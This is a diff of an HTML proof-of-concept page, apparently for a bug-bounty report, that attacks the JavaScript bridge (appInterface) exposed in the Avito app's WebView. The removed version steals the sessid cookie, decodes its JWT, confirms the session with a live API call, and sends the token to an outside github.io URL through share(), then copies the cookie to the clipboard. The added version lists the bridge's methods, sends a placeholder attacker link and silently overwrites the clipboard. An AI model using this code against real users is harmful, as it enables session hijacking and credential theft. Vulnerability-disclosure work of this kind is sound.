@@ -2,65 +2,38 @@
 <html>
 <head><title>Avito Support</title>
 <style>
-  body { font-family: monospace; padding: 20px; background: #fff; }
-  pre { background: #f0f0f0; padding: 10px; word-break: break-all; font-size: 12px; }
-  .ok { color: green; font-weight: bold; font-size: 16px; }
-  .err { color: red; }
+  body { font-family: monospace; padding: 20px; }
+  .ok { color: green; font-weight: bold; }
+  .err { color: red; font-weight: bold; }
 </style>
 </head>
 <body>
-<h2>appInterface PoC</h2>
-<div id="out">Loading...</div>
+<h2>PoC: appInterface exposure</h2>
+<div id="out"></div>
 <script>
 window.onload = function() {
   var out = document.getElementById('out');
-  var log = function(html) { out.innerHTML += html + '<br>'; };
+  var log = function(html) { out.innerHTML += '<p>' + html + '</p>'; };
 
-  // 1. Показываем cookies
-  var cookie = document.cookie;
-  var m = cookie.match(/sessid=([^;]+)/);
-  var sessid = m ? m[1] : null;
+  log('Origin: <b>' + location.origin + '</b>');
+  log('Loaded inside Avito WebView');
 
-  log('<b>document.cookie length:</b> ' + cookie.length + ' bytes');
-
-  if (!sessid) {
-    log('<span class="err">sessid NOT FOUND in cookies</span>');
-    return;
-  }
-
-  // 2. Декодируем JWT payload прямо на экране
-  try {
-    var parts = sessid.split('.');
-    var payload = JSON.parse(atob(parts[1]));
-    log('<span class="ok">JWT DECODED:</span>');
-    log('<pre>' + JSON.stringify(payload, null, 2) + '</pre>');
-    // payload.u = user_id, payload.exp = expiry
-  } catch(e) {
-    log('<span class="err">JWT decode error: ' + e + '</span>');
-  }
-
-  // 3. Живой API-запрос — показывает что сессия рабочая
-  fetch('/api/1/notifications/count', { credentials: 'include' })
-    .then(function(r) { return r.json(); })
-    .then(function(d) {
-      log('<span class="ok">API /notifications/count → ' + JSON.stringify(d) + '</span>');
-    })
-    .catch(function(e) {
-      log('<span class="err">API error: ' + e + '</span>');
-    });
-
-  // 4. share sheet с токеном
   if (window.appInterface) {
-    log('<b>appInterface.share() triggered</b>');
+    var methods = Object.getOwnPropertyNames(window.appInterface);
+    log('<span class="ok">appInterface FOUND</span>');
+    log('Methods: <b>' + JSON.stringify(methods) + '</b>');
+
     window.appInterface.share(
-      'Avito – у вас новое сообщение',
-      'Проверьте объявление',
-      'https://voborgus.github.io/bb-poc-repo/?s=' + encodeURIComponent(sessid)
+      'Avito — новое сообщение',
+      'Вам пришло сообщение от покупателя',
+      'https://voborgus.github.io/bb-poc-repo/?token=ATTACKER_CONTROLLED'
     );
-    window.appInterface.copy(cookie);
-    log('<b>appInterface.copy() — ' + cookie.length + ' bytes to clipboard</b>');
+    log('<span class="ok">appInterface.share() called → check share sheet</span>');
+
+    window.appInterface.copy('SILENT_CLIPBOARD_WRITE_NO_PROMPT');
+    log('appInterface.copy() called — clipboard overwritten silently');
   } else {
-    log('<span class="err">appInterface NOT FOUND</span>');
+    log('<span class="err">appInterface NOT FOUND (not in Avito WebView)</span>');
   }
 };
 </script>
